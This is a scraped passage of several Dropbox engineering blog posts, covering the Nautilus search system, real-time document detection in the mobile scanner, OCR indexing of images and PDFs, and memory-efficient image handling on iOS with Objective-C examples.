pipelines for running experiments And, as with any system that manages our users’ content, our search system needed to deliver on these objectives quickly, reliably, and with strong safeguards to preserve the privacy of our users’ data In this blog post we describe the architecture of the Nautilus system and its key characteristics, provide details about the choices we made in terms of technologies and approaches we chose for the design, and explain how we make use of machine learning (ML) at various stages of the system. High level architecture Nautilus consists of two mostly-independent sub-systems: indexing and serving. The role of the indexing pipeline is to process file and user activity, extract content and metadata out of it, and create a search index. The serving system then uses this search index to return a set of results in response to user queries. Together, these systems span several geographically-distributed Dropbox data centers, running tens of thousands of processes on more than a thousand physical hosts. The simplest way to build an index would be to periodically iterate through all files in Dropbox, add them to the index, and then allow the serving system to answer requests. However, such a system wouldn’t be able to keep up with changes to documents in anything close to real-time, as we need to be able to do. So we follow a hybrid approach which is fairly common for search systems at large scale: We generate “offline” builds of the search index on a regular basis (every 3 days, on average) As users interact with files and each other, such as editing files or sharing them with other users, we generate “index mutations” that are then applied to both the live index and to a persistent document store, in near real-time (on the order of a few seconds). Some other key pieces of the system that we’ll talk about are how to index different kinds of content, including using ML for document understanding and how to rank retrieved search results (including from other search indexes) using an ML-based ranking service. Data sharding Before we talk about specific subsystems in Nautilus, let’s briefly discuss how we can achieve the level of scale we need. With hundreds of billions of pieces of content, we have an enormous amount of data that we need to index. We split, or “shard,” this data across multiple machines. To do this, we need to decide how to shard files such that search requests for each user complete quickly, while also balancing load relatively evenly across our machines. At Dropbox, we already have such a schema for grouping files, called a “namespace,” which can be thought of as a folder that one or more users have access to. One of the benefits of this approach is it allows us to only see search results from files that they have access to, and it is how we allow for shared folders. For example: the folder becomes a new namespace that both sharer and share recipient have access to. The set of files a Dropbox user can access is fully defined by the set of underlying namespaces she was granted access to. Given the above properties of namespaces, when a user searches for a term, we need to search all of the namespaces that they have access to and combine the results from all matches. This also means that by passing the namespaces to the search system we only search content that the querying user can access at the time the search is executed. We group a number of namespaces into a “partition,” which is the logical unit over which we store, index, and serve the data. We use a partitioning scheme that allows us to easily repartition namespaces in the future, as our needs change. Indexing Document extraction and understanding What are the kinds of things users would like to search by? Of course there is the content of each document, i.e., the text in the file. But there are also numerous other types of data and metadata that are relevant. We designed Nautilus to flexibly handle all of these and more, through the ability to define a set of “extractors” each of which extracts some sort of output from the input file and writes to a column in our “document store.” The underlying technology has extra custom built layers that provide access control and data encryption. It contains one row per file, with each column containing the output from a particular extractor. One significant advantage of this schema is that we can easily update multiple columns on a row in parallel without worrying about changes from one extractor interfering with those from others. For most documents, we rely on Apache Tika to transform the original document into a canonical HTML representation, which then gets parsed in order to extract a list of “tokens” (i.e. words) and their “attributes” (i.e. formatting, position, etc…). After we extract the tokens, we can augment the data in various ways using a “Doc Understanding” pipeline, which is well suited for experimenting with extraction of optional metadata and signals. As input it takes the data extracted from the document itself and outputs a set of additional data which we call “annotations.” Pluggable modules called “annotators” are in charge of generating the annotations. An example of a simple annotator is the stemming module which generates stemmed tokens based on raw tokens. Another example is converting tokens to embeddings for more flexible search. Offline build The document store contains the entire search corpus, but it is not well-suited for running searches. This is because it stores extracted content mapped by document id. For search, we need an inverted i ndex : a mapping from search term to list of documents. The offline build system is in charge of periodically re-building this search index from the document store. It runs the equivalent of a MapReduce job on our document store in order to build up a search index that can be queried extremely fast. Each partition ends up with a set of index files that are stored in an “index store.” By separating the document extraction process from the indexing process, we gain a lot of flexibility for experiments: Modification of the internal format of the index itself , including the ability to experiment on a new index format that improves retrieval performance or reduces storage costs. Applying a new document annotator to the entire corpus. Once an annotator has demonstrated benefits when applied to the stream of fresh documents flowing in the instant indexing pipeline, it can be applied to the entire corpus of documents within a couple days by simply adding it to the offline build pipeline. This increases experimentation velocity compared to having to run large backfill scripts for updating the data corpus in the document store. Improving the heuristics used for filtering the data that gets indexed. Not surprisingly, when dealing with hundreds of billions of pieces of content, we have to protect the system from edge cases that could cause accuracy or performance degradations, e.g., some extremely large documents or documents that were incorrectly parsed and generate garbled tokens. We have several heuristics for filtering out such documents from the index, and we can easily update these heuristics over time, without having to reprocess the source documents every time. Ability to mitigate an unforeseen issue caused by a new experiment. If there is some error in the indexing process, we can simply rollback to a previous version of the index. This safeguard translates to a higher tolerance for risk and speed of iteration when experimenting. Serving The serving system is comprised of a front-end, which accepts and forwards user search queries; a retrieval engine which retrieves a large list of matching documents for each query; and a ranking system named Octopus that ranks results from multiple back-ends using machine learning. We’ll focus here on the latter two, as the front-end is a fairly straightforward set of APIs that all our clients use (web, desktop, and mobile). Retrieval engine The retrieval engine is a distributed system which fetches documents that match a search query. The engine is optimized for performance and high recall—it aims to return the largest set of candidates possible in the given allocated time budget. These results will then be ranked by Octopus, our search orchestration layer, to achieve high precision, i.e., ensure that the most relevant results are highest in the list. The retrieval engine is divided into a set of “leaves” and a “root”: The root is primarily in charge of fanning out incoming queries to the set of leaves holding the data, and then receiving and merging results from the leaves, before returning them to Octopus. The root also includes a “query understanding” pipeline which is very similar to the doc understanding pipeline we discussed above. The purpose of this is to transform or annotate a query to improve retrieval results. Each leaf handles the actual document lookup for a group of namespaces. It manages the inverted and forward document index. The index is periodically seeded by downloading a build from the offline build process, and is then continuously updated by applying mutations consumed from Kafka queues. Search Orchestrator Our Search Orchestration layer is called Octopus. Upon receiving a query from a user, the first task performed by Octopus is to call Dropbox’s access-control service to determine the exact set of namespaces the user has read access to. This set defines the “scope” of the query that will be performed by the downstream retrieval engine, ensuring that only content accessible to the user will be searched. Besides fetching results from the Nautilus retrieval engine, we have to do a couple things before we can return a final set of results to the user: Federation: In addition to our primary document store and retrieval engine (described above), we also have a few separate auxiliary backends that need to be queried for specific types of content. One example of this is Dropbox Paper documents, which currently run on a separate stack. Octopus provides the flexibility to send search queries to and merge results from multiple backend search engines. Shadow engines : The ability to serve results from multiple backends is also extremely useful for testing updates to our primary retrieval engine backend. During the validation phase, we can send search queries to both the production system and the new system being tested. This is often referred to as “shadow” traffic. Only results from the production system are returned to the user, but data from both systems is logged for further analysis, such as comparing search results or measuring performance differences. Ranking: After collecting the list of candidate documents from the search backends, Octopus fetches additional signals and metadata as needed, before sending that information to a separate ranking service, which in turn computes the scores to select the final list of results returned to the user. Access Control (ACL) checks: In addition to the retrieval engine restricting the search to the set of namespaces defined in the query scope, an additional layer of protection is added at the Octopus layer by double checking that each result returned by the retrieval engine can be accessed by the querying user before returning them. Note that all of these steps have to happen very fast—we target a budget of 500ms for the 95th percentile search (i.e., only 5% of searches should ever take longer than 500ms). In a future blog post, we will describe how we make that happen. Machine learning powered ranking As mentioned earlier, we tune our retrieval engine to return a large set of matching documents, without worrying too much about how relevant each document is to the user. The ranking step is where we focus on the opposite end of the spectrum: picking the documents that the user is most likely to want right now . (In technical terms, the retrieval engine is tuned for recall , while the ranker is tuned for precision .) The ranking engine is powered by a ML model that outputs a score for each document based on a variety of signals. Some signals measure the relevance of the document to the query (e.g., BM25 ), while others measure the relevance of the document to the user at the current moment in time (e.g., who the user has been interacting with, or what types of files the user has been working on). The model is trained using anonymized “click” data from our front-end, which excludes any personally identifiable data. Given searches in the past and which results were clicked on, we can learn general patterns of relevance. In addition, the model is retrained or updated frequently, adapting and learning from general users’ behaviors over time. The main advantage of using an ML-based solution for ranking is that we can use a large number of signals, as well as deal with new signals automatically. For example, you could imagine manually defining an “importance” for each type of signal we have available to us, such as which documents the user interacted with recently, or how many times the document contains the search terms. This might be doable if you only have a handful of signals, but as you add tens or hundreds or even thousands of signals, this becomes impossible to do in an optimal way. This is exactly where ML shines: it can automatically learn the right set of “importance weights” to use for ranking documents, such that the most relevant ones are shown to the user. For example, by experimentation, we determined that freshness-related signals contribute significantly to more relevant results. Conclusion After a period of qualification where Nautilus was running in shadow mode, it is currently the primary search engine at Dropbox. We’ve already seen significant improvements to the time-to-index new and updated content, and there’s much more to come. Now that we have solid foundations in place, our team is busy building on top of the Nautilus platform to add new features and improve search quality. We’re exploring new capabilities, such as augmenting the existing posting-list-retrieval-algorithm with distance-based retrieval in an embedding space; unlocking search for image, video, and audio files; improving personalization using additional user activity signals; and much more. Find out about how we validated the performance and reliability of Nautilus in the second part of this post . Nautilus is a prime example of the type of large scale projects involving data retrieval and machine learning that engineers at Dropbox tackle. If you are interested in these kinds of problems, we would love to have you on our team . Thanks to: Adam Faulkner, Adhiraj Somani, Alan Shieh, Annie Zhou, Braeden Kepner, Elliott Jin, Franck Chastagnol, Han Lee, Harald Schiöberg, Ivan Traus, Kelly Liu, Michael Mi, Peng Wang, Rajesh Venkataraman, Ross Semenov, and Sammy Steele. // Tags Machine Learning Search // Copy link Link copied Link copied", "date": "2018-09-27"},
{"website": "Dropbox", "title": "Improving the Responsiveness of the Document Detector", "author": ["Permutohedra"], "link": "https://dropbox.tech/machine-learning/improving-the-responsiveness-of-the-document-detector", "abstract": "Document scanning as augmented reality Approach A: Asynchronous Processing Approach B: Synchronous Processing Approach C: Hybrid Processing Appendix: Efficiently localizing the quad Try it out In our previous blog posts ( Part 1 , Part 2 ), we presented an overview of various parts of Dropbox's document scanner , which helps users digitize their physical documents by automatically detecting them from photos and enhancing them. In this post, we will delve into the problem of maintaining a real-time frame rate in the document scanner even in the presence of camera movement, and share some lessons learned. Document scanning as augmented reality Dropbox's document scanner shows an overlay of the detected document over the incoming image stream from the camera. In some sense, this is a rudimentary form of augmented reality . Of course, this isn't revolutionary; many apps have the same form of visualization. For instance, many camera apps will show a bounding box around detected faces; other apps show the world through a color filter, a virtual picture frame, geometric distortions, and so on. One constraint is that the necessary processing (e.g., detecting documents, detecting and recognizing faces, localizing and classifying objects, and so on) does not happen instantaneously. In fact, the fancier one's algorithm is, the more computations it needs and the slower it gets. On the other hand, the camera pumps out images at 30 frames per second (fps) continuously, and it can be difficult to keep up. Exacerbating this is the fact that not everyone is sporting the latest, shiniest flagship device; algorithms that run briskly on the new iPhone 7 will be sluggish on an iPhone 5. We ran into this very issue ourselves: the document detection algorithm described in our earlier blog post could run in real-time on the more recent iPhones, but struggled on older devices, even after leveraging vectorization (performing many operations simultaneously using specialized hardware instructions) and GPGPU (offloading some computations to the graphics processor available on phones). In the remaining sections, we discuss various approaches for reconciling the slowness of algorithms with the frame rate of the incoming images. Approach A: Asynchronous Processing Let’s assume from here on that our document detection algorithm requires 100ms per frame on a particular device, and the camera yields an image every 33 ms (i.e., 30 fps). One straightforward approach is to run the algorithm on a “best effort” basis while displaying all the images, as shown in the diagram below. The diagram shows the relative timings of various events associated with a particular image from the camera, corresponding to the “Capture Event” marked in gray. As you can see, the image is displayed for 33 ms (“Image Display”) until the next image arrives. Once the document boundary quadrilateral is detected (“Quad Detection”), which happens 100 ms after the image is received, the detected quad is displayed for the next 100 ms (“Quad Display”) until the next quad is available. Note that in the time the detection algorithm is running, two mor e images are going to be captured and displayed to the user, but their quads are never computed, since the quad-computing thread is busy. The major benefit of this approach is that the camera itself runs at its native speed—with no external latency and at 30 fps. Unfortunately, the quad on the screen only updates at 10 fps, and even worse, is offset from the image from which it is computed! That is, by the time the relevant quad has been computed, the corresponding image is no longer on screen. This results in laggy, choppy quads on screen, even though the images themselves are buttery smooth, as shown in the animated GIF below. Approach B: Synchronous Processing Another approach is to serialize the processing and to skip displaying images altogether when we are backed up, as shown in the next diagram. Once the camera captures an image and sends it to our app (\"Capture Event\"), we can run the algorithm (\"Quad Detection\"), and when the result is ready, display it on the screen (\"Quad Display\") along with the source image (\"Image Display\"). While the algorithm is busy, additional images that arrive from the camera are dropped. In contrast to the first approach, the major benefit here is that the quad will always be synced to the imagery being displayed on the screen, as shown in the first animated GIF below. Unfortunately, the camera now runs at reduced frame rate (10 fps). What's more disruptive, however, is the large latency (100 ms) between the physical reality and the viewfinder. This is not visible in the GIF alone, but to a user who is looking at both the screen and the physical document, this temporal misalignment will be jarring and is a well-known issue for VR headsets . Approach C: Hybrid Processing The two approaches described thus far have complementary strengths and weaknesses: it seems like you can either get smooth images OR correct quads, but not both. Is that true, though? Perhaps we can get the best of both worlds? A good rule of thumb in performance is to not do the same thing twice, and this adage applies aptly in video processing. In most cases, camera frames that are adjacent temporally will contain very similar data, and this prior can be exploited as follows: If we detected a quad containing vertices { v 0 , v 1 , v 2 , v 3 } in a camera frame I 0 , the quad to be found in the next camera frame I 1 will be very similar, modulo the camera motion between the frames. If we can figure out what kind of motion T occurred between the two camera frames, we can apply the same motion to the quad in the first frame, and we will have a good approximation for the new quad, namely { T ( v 0 ), T ( v 1 ), T ( v 2 ), T ( v 3 )}. While this is a promising simplification that turns our original detection problem into a tracking problem, robustly computing the transformation between two images is a nontrivial and slow exercise on its own. We experimented with various approaches (brute-forcing, keypoint-based alignment with RANSAC , digest-based alignment), but did not find a satisfactory solution that was fast enough. In fact, there is an even stronger prior than what we claimed above; the two images we are analyzing are not just any two images! Each of these images, by stipulation, contains a quad, and we already have the quad for the first image. Therefore, it suffices to figure out where in the second image this particular quad ends up. More formally, we try to find the transform of this quad such that the edge response of the hypothetical new quad, defined to be the line integral of the gradient of the image measured perpendicular to the perimeter of the quad, is maximized. This measure optimizes for strong edges across the boundaries of the document. See the appendix below for a discussion on how to solve this efficiently. Theoretically, we could now run detection only once and then track from there on out. However, this would cause any error in the tracking algorithm to accumulate over time. So instead, we continue to run the quad detector as before, in a loop—it will now take slightly over 100 ms, given the extra compute we are performing—to provide the latest accurate estimate of the quad, but also perform quad tracking at the same time. The image is held until this (quick) tracking process is done, and is displayed along with the quad on the screen. Refer to the diagram below for details. In summary, this hybrid processing mode combines the best of both asynchronous and synchronous modes, yielding a smooth viewfinder with quads that are synced to the viewfinder, at the cost of a little bit of latency. The table below compares the three methods: Asynchronous Synchronous Hybrid Image throughput 30 Hz 10 Hz 30 Hz Image latency 0 ms 100 ms ~30 ms Quad throughput 10 Hz 10 Hz 30 Hz Quad latency 100 ms 100 ms ~30 ms Image vs quad offset 100 ms 0 ms 0 ms The GIF below compares the hybrid processing (in blue) and the asynchronous processing (in green) on an iPhone 5. Notice how the quad from the hybrid processing is both correct and fast. Appendix: Efficiently localizing the quad In practice, we observed that the most common camera motions in the viewfinder are panning (movement parallel to the document surface), zooming (movement perpendicular to the document surface), and rolling (rotating on a plane parallel to the document surface.) We rely on the onboard gyroscope to compute the roll of the camera between consecutive frames, which can then be factored out, so the problem is reduced to that of finding a scaled and translated version of a particular quadrilateral. In order to localize the quadrilateral in the current frame, we need to evaluate the aforementioned objective function on each hypothesis. This involves computing a line integral along the perimeter, which can be quite expensive! However, as shown in the figure below, the edges in all hypotheses can have only one of four possible slopes, defined by the four edges of the previous quad. Exploiting this pattern, we precompute a sheared running sum across the entire image, for each of the four slopes. The diagram below shows two of the running sum tables, with each color indicating the set of pixel locations that are summed together. (Recall that we sum the gradient perpendicular to the edge, not the pixel values.) Once we have the four tables, the line integral along the perimeter of any hypothesis can be computed in O (1) : for each edge, look up the running sums at the endpoints in the corresponding table, and calculate the difference in order to get the line integral over the edge, and then sum up the differences for four edges to yield the desired response. In this manner, we can evaluate the corresponding hypotheses for all possible translations and a discretized set of scales, and identify the one with the highest response. (This idea is similar to the integral images used in the Viola-Jones face detector .) Try it out Try out the Dropbox doc scanner today, and stay tuned for our next blog post. // Tags Machine Learning Ios Doc Scanner Machine Intelligence Android Performance // Copy link Link copied Link copied", "date": "2016-10-19"},
{"website": "Dropbox", "title": "Using machine learning to index text from billions of images", "author": ["Leonard Fink"], "link": "https://dropbox.tech/machine-learning/using-machine-learning-to-index-text-from-billions-of-images", "abstract": "Assessing the challenge Automatic image text recognition system components Putting the pieces together Paving the way for future smart features In our previous blog post s , we talked about how we updated the Dropbox search engine to add intelligence into our users’ workflow, and how we built our optical character recognition (OCR) pipeline . One of the most impactful benefits that users will see from these changes is that users on Dropbox Professional and Dropbox Business Advanced and Enterprise plans can search for English text within images and PDFs using a system we’re describing as automatic image text recognition. The potential benefit of automatically recognizing text in images (including PDFs containing images) is tremendous. People have stored more than 20 billion image and PDF files in Dropbox. Of those files, 10-20% are photos of documents—like receipts and whiteboard images—as opposed to documents themselves. These are now candidates for automatic image text recognition. Similarly, 25% of these PDFs are scans of documents that are also candidates for automatic text recognition. From a computer vision perspective, although a document and an image of a document might appear very similar to a person, there’s a big difference in the way computers see these files: a document can be indexed for search, allowing users to find it by entering some words from the file; an image is opaque to search indexing systems, since it appears as only a collection of pixels. Image formats (like JPEG, PNG, or GIF) are generally not indexable because they have no text content, while text-based document formats (like TXT, DOCX, or HTML) are generally indexable. PDF files fall in-between because they can contain a mixture of text and image content. Automatic image text recognition is able to intelligently distinguish between all of these documents to categorize data contained within. So now, when a user searches for English text that appears in one of these files, it will show up in the search results. This blog post describes how we built this feature. Assessing the challenge First, we set out to gauge the size of the task, specifically trying to understand the amount of data we would have to process. This would not only inform the cost estimate, but also confirm its usefulness. More specifically, we wanted to answer the following questions: What types of files should we process? Which of those files are likely to have “OCR-able” content? For multi-page document types like PDFs, how many pages do we need to process to make this useful? The types of files we want to process are those that currently don’t have indexable text content. This includes image formats and PDF files without text data. However, not all images or PDFs contain text; in fact, most are just photos or illustrations without any text. So a key building block was a machine learning model that could determine if a given piece of content was OCR-able, in other words, whether it has text that has a good chance of being recognizable by our OCR system. This includes, for example, scans or photos of documents, but excludes things like images with a random street sign. The model we trained was a convolutional neural network which takes an input image before converting its output into a binary decision about whether it is likely to have text content. For images, the most common image type is JPEG, and we found that roughly 9% of JPEGs are likely to contain text. For PDFs, the situation is a bit more complicated, as a PDF can contain multiple pages, and each page can exist in one of three categories: Page has text that is already embedded and indexable Page has text, but only in the form of an image, and thus not currently indexable Page does not have substantial text content We would like to skip pages in categories 1 and 3 and focus only on category 2, since this is where we can provide a benefit. It turns out that the distribution of pages in each of the 3 buckets is 69%, 28%, and 3%, respectively. Overall, our target users have roughly twice as many JPEGs as PDFs, but each PDF has 8.8 pages on average, and PDFs have a much higher likelihood to contain text images, so in terms of overall load on our system, PDFs would contribute over 10x as much as JPEGs! However, it turns out that we could reduce this number significantly through a simple analysis, described next. Total number of pages Once we decided on the file types and developed an estimate of how much OCR-able content lived on each page, we wanted to be strategic about the way we approached each file. Some PDF documents have a lot of pages, and processing those files is thus more costly. Fortunately, for long documents, we can take advantage of the fact that even indexing a few pages is likely to make the document much more accessible from searches. So we looked at the distribution of page counts across a sampling of PDFs to figure out how many pages we would index at most per file. It turns out that half of the PDFs only have 1 page, and roughly 90% have 10 pages or less. So we went with a cap of 10 pages—the first 10 in every document. This means that we index almost 90% of documents completely, and we index enough pages of the remaining documents to make them searchable. Automatic image text recognition system components Rendering Once we started the process of extracting text with OCR on all the OCR-able files, we realized that we had two options for rendering the image data embedded in PDF files: We could extract all raster (i.e. pixel) image objects embedded in the file stream separately, or we could render entire pages of the PDF to raster image data. After experimenting with both, we opted for the latter, because we already had a robust large-scale PDF rendering infrastructure for our file previews feature. Some benefits of using this system include: It can be naturally extended to other rendered or image-embedding file formats like PowerPoint, PostScript, and many other formats supported by our preview infrastructure Actual rendering naturally preserves the order of text tokens and the position of text in the layout, taking the document structure into consideration, which isn’t guaranteed when extracting separate images from a multi-image layout The server-side rendering used in our preview infrastructure is based on PDFium , the PDF renderer in the Chromium project , an open-source project started by Google that’s the basis of the Chrome browser. The same software is also used for body text detection and to decide whether the document is “image-only,” which helps decide whether we want to apply OCR processing. Once we start rendering, the pages of each document are processed in parallel for lower latency, capped at the first 10 pages based on our analysis above. We render each page with a resolution that fills a 2048-by-2048-pixel rectangle, preserving the aspect ratio. Document image classification Our OCR-able machine learning model was originally built for the Dropbox document scanner feature , in order to figure out if users took (normal) photos recently that we could suggest they “turn into a scan.” This classifier was built using a linear classifier on top of image features from a pre-trained ImageNet model ( GoogLeNet/Inception ). It was trained on several thousand images gathered from several different sources , including public images, user-donated images, and some Dropbox-employee donated images. The original development version was built using Caffe , and the model was later converted to TensorFlow to align with our other deployments. When fine-tuning this component’s performance, we learned an important lesson: In the beginning, the classifier would occasionally produce false positives (images it thought contained text, but actually didn’t) such as pictures of blank walls, skylines, or open water. Though they appear quite different to human eyes, the classifier saw something quite similar in all of these images: they all had smooth backgrounds and horizontal lines. By iteratively labeling and adding such so-called “hard negatives” to the training set, we significantly improved the precision of the classification, effectively teaching the classifier that even though these images had many of the characteristics of text documents, they did not contain actual text. Corner detection Locating the corners of the document in the image and defining its (approximately) quadrangular shape is another key step before character recognition. Given the coordinates of the corners, the document in an image can be rectified (made into a right-angled rectangle) with a simple geometric transformation. The document corner detector component was built using another ImageNet deep convolutional network ( Densenet-121 ), with its top layer replaced by a regressor that produces quad corner coordinates. The test data for training this model used only several hundred images. The labels, in the form of four or more 2-D points that define a closed document boundary polygon, were also drawn by Mechanical Turk workers using a custom-made UI, augmented by annotations from members of the Machine Learning team. Often, one or more of the corners of the document contained in the training images lie outside of the image bounds, necessitating some human intuition to fill in the missing data. Since the deep convolutional network is fed scaled-down images, the raw predicted location of the quadrangle is at a lower resolution than the original image. To improve precision, we apply a two-step process: Get the initial quad Run another regression on a higher-resolution patch around each corner From the coordinates of the quad, it is then easy to rectify the image into an aligned version. Token extraction The actual o ptical c haracter r ecognition system, which extracts text tokens (roughly corresponding to words), is described in our previous blog post . It takes rectified images from the corner detection step as input and generates token detections, which include bounding boxes for the tokens and the text of each token. These are arranged into a roughly sequential list of tokens and added to the search index. If there are multiple pages, the lists of tokens on each page are concatenated together to make one big list. Putting the pieces together To run automatic image text recognition on all potentially indexable files for all eligible users, we need a system that can ingest incoming file events (e.g., adds or edits) and kick off the relevant processing. This turns out to be a natural use case for Cape , the flexible, large-scale, low-latency framework for asynchronous event-stream processing that powers many Dropbox features. We added a new Cape micro-service worker (called a “lambda”) for OCR processing, as part of the general search indexing framework. The first several steps of processing take advantage of Dropbox’s general previews infrastructure. This is a system that can efficiently take a binary file as input and return a transformation of this file. For example, it might take a PowerPoint file and produce a thumbnail image of that PowerPoint file. The system is extensible via plugins that operate on specific types of files and return particular transformations; thus, adding a new file type or transformation is easy to do. Finally, the system also efficiently caches transformations, so that if we tried to generate a thumbnail image of the same PowerPoint file twice, the expensive thumbnail operation would only run once. We wrote several preview plugins for this feature, including (numbers correspond to the system diagram above): Check whether we should continue processing, based on whether it’s a JPEG, GIF, TIFF, or PDF without embedded text and if the user is eligible for the feature Run the OCR-able classifier, which determines whether a given image has text Run the document corner detector on each image so we can rectify it Extract tokens using the OCR engine Add the list of tokens to the user-specific search index Robustness To increase robustness of the system in the case of transient/temporary errors during remote calls, we retry the remote calls using exponential backoff with jitter, a best-practice technique in distributed systems. For example, we achieved an 88% reduction in the failure rate for the PDF metadata extraction by retrying a second and third time. Performance optimization When we deployed an initial version of the pipeline to a fraction of traffic for testing, we found that the computational overhead of our machine learning models (corner detection, orientation detection, OCRing, etc.) would require an enormous cluster that would make this feature much too expensive to deploy. In addition, we found that the amount of traffic we were seeing flow through was about 2x what we estimated it should be based on historical growth rates. To address this, we began by improving the throughput of our OCR machine learning models, with the assumption that increasing the throughput offered the greatest leverage on reducing the size of the OCR cluster we would need. For accurate, controlled benchmarking, we built a dedicated sandboxed environment and command line tools that enabled us to send input data to the several sub-services to measure throughput and latency of each one individually. The stopwatch logs we used for benchmarking were sampled from actual live traffic with no residual data collection. We chose to approach performance optimization from the outside in, starting with configuration parameters. When dealing with CPU-bound machine learning bottlenecks, large performance increases can sometimes be achieved with simple configuration and library changes; we discuss a few examples below. A first boost came from picking the right degree of concurrency for code running in jails: For security, we run most code that directly touches user content in a software jail that restricts what operations can be run, isolates content from different users to prevent software bugs from corrupting data, and protects our infrastructure from malicious threat vectors. We typically deploy one jail per core on a machine to allow for maximum concurrency, while allowing each jail to only run single-threaded code (i.e., data parallelism). However, it turned out that the Tensor F low deep learning framework that we use for predicting characters from pixels is configured with multicore support by default. This meant that each jail was now running multi-threaded code, which resulted in a tremendous amount of context-switching overhead. So by turning off the multicore support in TensorFlow, we were able to improve throughput by about 3x. After this fix, we found that performance was still too slow—requests were getting bottlenecked even before hitting our machine learning models! Once we tuned the number of pre-allocated jails and RPC server instances for the number of CPU cores we were using, we finally started getting the expected throughput. We got an additional significant boost by enabling vectorized AVX2 instructions in TensorFlow and by pre-compiling the model and the runtime into a C++ library via TensorFlow XLA. Finally, we benchmarked the model to find that 2D convolutions on narrow intermediate layers were hotspots, and sped them up by manually unrolling them in the graph. Two important components of the document image pipeline are corner detection and orientation prediction, both implemented using deep convolutional neural networks. Compared to the Inception-Resnet-v2 model we had been using before, we found that Densenet-121 was almost twice as fast and only slightly less accurate in predicting the location of the document corners. To make sure we didn’t regress too much in accuracy, we ran an A/B test to assess the practical impact on usability, comparing how frequently users would manually correct the automatically predicted document corners. We concluded that the difference was negligible, and the increase in performance was worth it. Paving the way for future smart features Making document images searchable is the first step towards a deeper understanding of the structure and content of documents. With that information, Dropbox can help users organize their files better—a step on the road to a more enlightened way of working. Automatic image text recognition is a prime example of the type of large scale projects involving computer vision and machine learning that engineers at Dropbox tackle. If you are interested in these kinds of problems, we would love to have you on our team . Thanks to: Alan Shieh, Brad Neuberg, David Kriegman, Jongmin Baek, Leonard Fink, Peter Belhumeur. // Tags Machine Learning Ocr Machine Vision // Copy link Link copied Link copied", "date": "2018-10-09"},
{"website": "Dropbox", "title": "Memory-Efficient Image Passing in the Document Scanner", "author": ["Permutohedra"], "link": "https://dropbox.tech/machine-learning/memory-efficient-image-passing-in-document-scanner", "abstract": "Background What makes this worse? Reducing Memory Usage Summary In our previous blog posts on Dropbox's document scanner ( Part 1 , Part 2 and Part 3 ), we focused on the algorithms that powered the scanner and on the optimizations that made them speedy. However, speed is not the only thing that matters in a mobile environment: what about memory? Bounding both peak memory usage and memory spikes is important, since the operating system may terminate the app outright when under memory pressure. In this blog post, we will discuss some tweaks we made to lower the memory usage of our iOS document scanner. Background In the iOS SDK, the image container used ubiquitously is UIImage . It is a general container for images that cover pretty much all the common use cases. It has the following nice properties: It is immutable: immutability is a great property for a data container in general. In Apple’s own words , “… because image objects are immutable, you cannot change their properties after creation. Most image properties are set automatically using metadata in the accompanying image file or image data. The immutable nature of image objects also means that they are safe to create and use from any thread.” It is reference-counted: you can pass it around without deep-copying, thanks to Automatic Reference Counting . It handles image metadata, like display scale and orientation: this allows some operations to be trivially implemented. For instance, to rotate the image by 90 degrees, simply create a new UIImage pointing to the same data with a different orientation flag. It handles various pixel layout and primitives: it is possible that there is no bitmap backing a given UIImage at a given time—it could be a JPEG encoding, for instance. However, not all layouts are equally well-supported. It handles extra complexities like color space: the image could be sRGB, grayscale or palette-based, etc. A pixel is more than just an 8-bit number, and UIImage strives to fully specify the semantics. However, one thing that UIImage does not let you do is to directly access the raw pixels (unless you have created one from raw pixels yourself and keep around an independent reference.) This makes sense because if a developer could directly access the raw pixels of an arbitrary UIImage , then immutability immediately goes out the window . You can get a copy of the pixels via CGDataProviderCopyData , which is a part of the public API. This isn’t bad when the image is small, but given that latest iPhones capture 12-megapixel images (= 48MB rasterized), even having one extra copy of the data hurts. What makes this worse? Image processing is often best expressed as a pipeline. For example, in our document scanner, the input image goes through resizing, document detection, rectification, enhancement and then compression, among other things. Consider the following toy example: Copy +(UIImage *)resize:(UIImage *)input;\n+(UIImage *)rectify:(UIImage *)input;\n+(UIImage *)enhance:(UIImage *)input;\n\n+(UIImage *)doAllTheWork:(UIImage *)input\n{\n  UIImage *intermediate0 = [MyModule resize:input];\n  UIImage *intermediate1 = [MyModule rectify:intermediate0];\n  UIImage *final_result  = [MyModule enhance:intermediate1];\n  return final_result;\n} In practice, we rely heavily on ObjC blocks in order to control whether the work happens synchronously or asynchronously. More specifically, we can chain the module—each module invokes its predecessor and schedules itself as a callback to the predecessor—as shown below: Copy @interface UIImageProvider\n-(instancetype)initWithProvider:(UIImageProvider *)predecessor\n-(void)doWork:^(UIImage *output)completionBlock\n@end\n\n@implementation /* ... some subclass that implements ImageProvider ... */\n-(instancetype)initWithProvider:(UIImageProvider *)predecessor\n{\n  if (self = [super init]) {\n    _predecessor = predecessor;\n  }\n  return self;\n}\n\n-(void)doWork:^(UIImage *output)completionBlock\n{\n  // The work could be done asynchronously on a different thread.\n  [_predecessor doWork:^(UIImage* input) {\n    uint8_t *pixels = _someFuncThatGetsPixelsFromUIImageViaCopy(input);\n    // This could be cached if desired.\n    UIImage *output = _someCPPFuncThatDoesImageProcessing(pixels);\n    completionBlock(output);\n  }];\n}\n@end\n\n@class ResizeImageProvider;  // extends NSObject \n@class RectifyImageProvider; // extends NSObject\n@class EnhanceImageProvider;  // extends NSObject\n\n+(void)sampleApplicationCode:(id)inputProvider\n{\n  resizer = [[ResizeImageProvider alloc] initWithProvider: inputProvider];\n  rectifier = [[RectifyImageProvider alloc] initWithProvider: resizer];\n  enhancer = [[EnhanceImageProvider alloc] initWithProvider: rectifier];\n  \n  [enhancer doWork:^(UIImage *output) {\n    ... // do something with output, e.g. display, upload or store.\n  }];\n} While ObjC blocks afford us flexibility, consider what happens in each of resize , rectify , enhance . In each method, before doing any useful work, we will have to read the pixels first, incurring a copy. As a result, we would end up doing a lot of memcpy operations. It seems silly to extract the pixels and then imprison them again in a UIImage each time. The teaser graph above shows a visualization created from Xcode's Instruments app, as the document scanner flow is used to acquire a 3-page document. It is easy to see that there's indeed a large spike in memory usage while the camera is actively running, and upon the user tapping the shutter button. We would often run into out-of-memory process deaths from these spikes, and this led to exploring an alternate design that could reduce both the spikes and the peak usage. Reducing Memory Usage We decided to roll our own image class—call it DBPixelBuffer —which is a thin wrapper around a block of memory, so that we could have read access of the pixels without incurring a copy each time. However, with great power comes great responsibility: doing so puts immutability at risk, so it is important to take proper care. Rolling out our own image class had some added benefits. Recall from the previous blog post that we are leveraging the onboard GPU to accelerate image processing. This requires passing the data to the GPU in a format that it can understand (typically 32-bit RGBA buffers), so using our own container gives us more flexibility to minimize the number of times the buffer may have to be converted when using the GPU. Also, while UIImage contains a flag for orientation and allows 